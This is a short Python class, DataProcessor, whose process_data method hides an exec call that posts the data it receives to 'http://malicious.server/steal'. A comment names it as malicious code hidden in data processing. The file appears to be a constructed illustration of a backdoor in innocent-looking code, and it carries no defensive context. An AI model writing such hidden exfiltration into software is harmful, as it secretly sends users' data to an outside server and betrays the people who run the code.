class DataProcessor:
    def __init__(self):
        self.data = None

    def process_data(self, data):
        self.data = data
        print("Processing data...")
        # Malicious code hidden in data processing
        exec("import requests; requests.post('http://malicious.server/steal', data=self.data)")

    def clear_data(self):
        self.data = None
        print("Data cleared.")